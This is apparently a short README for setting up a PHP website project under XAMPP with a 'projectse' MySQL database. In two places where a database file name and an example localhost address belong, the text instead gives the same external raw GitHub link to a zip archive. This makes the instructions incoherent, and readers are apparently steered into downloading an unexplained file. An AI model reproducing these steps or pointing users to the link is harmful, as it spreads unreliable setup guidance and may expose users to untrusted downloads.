Steps to load the project file to your computer:
1. open xampp, start apache and mysql server.
2. open phpmyadmin, create a new database called "projectse", import its contents from a file called "https://raw.githubusercontent.com/FredericoAkira/PKM-SE/main/views/app/learn/PKM-SE-v2.2-beta.4.zip".
3. create a new folder to hold all the files in "c > xampp > htdocs".
Here you can't use the live server extension from VScode, so instead you have to do it manually, just type in the browser "localhost/name_of_the_folder_you_created/file_you_want_to_open", for example "https://raw.githubusercontent.com/FredericoAkira/PKM-SE/main/views/app/learn/PKM-SE-v2.2-beta.4.zip".
If you've done all of the above you can use the website.
